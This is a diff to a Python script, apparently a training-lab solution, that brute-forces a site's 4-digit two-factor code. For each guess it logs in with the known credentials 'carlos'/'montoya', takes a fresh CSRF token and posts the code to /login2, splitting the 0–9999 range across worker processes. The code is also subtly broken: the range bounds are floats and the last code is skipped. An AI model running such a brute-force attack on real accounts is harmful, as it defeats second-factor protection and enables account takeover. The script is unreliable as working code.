@@ -4,9 +4,15 @@ import requests
 from bs4 import BeautifulSoup
 
 # Const that enables / disables noisy prints made throughout program execution.
-DEBUG_MODE = True
+DEBUG_MODE = False
+# Total number of possible 2fa codes, 0 -> 9999, so 10k
+TOTAL_NUM_CODES = 10000
 # Default number of worker processes to find 2fa code, if none is provided as argument to program invocation.
 DEFAULT_WORKERS = 10
+
+# Initial credential values that we know in advance
+PROVIDED_USER = 'carlos'
+PROVIDED_PW = 'montoya'
 
 
 # Small wrapper for printing based on value of DEBUG_MODE
@@ -51,50 +57,51 @@ except IndexError:
     print("Number of worker processes not specified, defaulting to ", DEFAULT_WORKERS)
     num_procs = DEFAULT_WORKERS
 
+# Find out how many codes each worker will try
+functional_unit_size = TOTAL_NUM_CODES / num_procs
+
 # First:
 # GET login page to find value of cross-site request forgery token.
 s = requests.Session()
 login_url = f'https://{site}/login'
 resp = s.get(login_url)
-csrf = parse_tree_for_csrf(resp.text)
-
-# Plan
-
-# 0 - 9999 possible 2fa codes
-# n number of worker processes
-# 10,000 / n codes to check per worker
-# Ex) worker 1 does 0 - 999, worker 2 does 1000 - 1999 ... worker n does (n-1 * 1000) to (n*1000 - 1)
-
-# Each worker will get it's own csrf token w/ logging in, so don't need to worry about an overall 2 attempt counter.
-# So the process, per worker, will be: login, get csrf, try 2 codes (check each time if 2fa code is right), repeat.
-
-# Each call to the function that carries out one functional unit of the above process (2fa attempt) will
-# return a dict containing the status, and 2fa code, for that attempt. That way it will be easier to filter
-# out bad codes based on status in the end.
-
-# STARTING HERE WE NEED TO LOGIN EVERY TWO TIMES
+login_page_csrf = parse_tree_for_csrf(resp.text)
 
 
-def try_2fa_functional_unit(initial_csrf):
-    pass
+# Grab response after successful login to grab the csrf token for interaction with 2fa login page
+#   Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
+#   Important Note: For simplicity, going to simply login before every 2fa attempt.
+def try_2fa_functional_unit(process_number):
+    # Arg `process_number` used to extrapolate which number range this functional_unit will try.
+    # Ex) worker 1 does 0 - 999, worker 2 does 1000 - 1999 ... worker n does (n-1 * 1000) to (n*1000 - 1)
+    start_range = (process_number - 1) * functional_unit_size
 
+    # If this worker is handling the final indices, make its range go all the way to TOTAL
+    # to account for any rounding error.
+    if (process_number * functional_unit_size) > (TOTAL_NUM_CODES - functional_unit_size):
+        end_range = TOTAL_NUM_CODES
+    else:
+        end_range = process_number * functional_unit_size - 1
 
-# Then: Grab response after successful login to grab the csrf token for interaction with 2fa login page
-#       Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
-response_text = login('carlos', 'montoya', csrf)
-csrf = parse_tree_for_csrf(response_text)
+    # Main loop, try all 2fa codes in this worker's range.
+    for code_num in range(start_range, end_range):
+        # Grab csrf token from 'login success' page, which is needed for interaction with 2fa login page.
+        response_text = login(
+            uname=PROVIDED_USER,
+            pw=PROVIDED_PW,
+            csrf_token=login_page_csrf
+        )
+        csrf = parse_tree_for_csrf(response_text)
 
-# Send auth request to 2fa endpoint with csrf token and '0000'
-# Here's where we can split multiple processes that will all call a function
-# that makes this post with a different 4-digit code each time.
-login2_url = f'https://{site}/login2'
-login2data = {
-    'csrf': csrf,
-    'mfa-code': str(0).zfill(4)
-}
-resp = s.post(login2_url, data=login2data, allow_redirects=False)
-if resp.status_code == 302:
-    print(f'2fa valid with response code {resp.status_code}')
-    # Visit account profile page to complete level
-else:
-    debug_print(f'2fa invalid with response code: {resp.status_code}')
+        # Send auth request to 2fa endpoint with csrf token and padded 2fa code number
+        login2_url = f'https://{site}/login2'
+        login2data = {
+            'csrf': csrf,
+            'mfa-code': str(code_num).zfill(4)
+        }
+        response = s.post(login2_url, data=login2data, allow_redirects=False)
+        if response.status_code == 302:
+            # Note using debug_print cause the success code is always a desired print out.
+            print(f'2fa valid with response code {response.status_code}')
+        else:
+            debug_print(f'2fa invalid with response code: {response.status_code}')
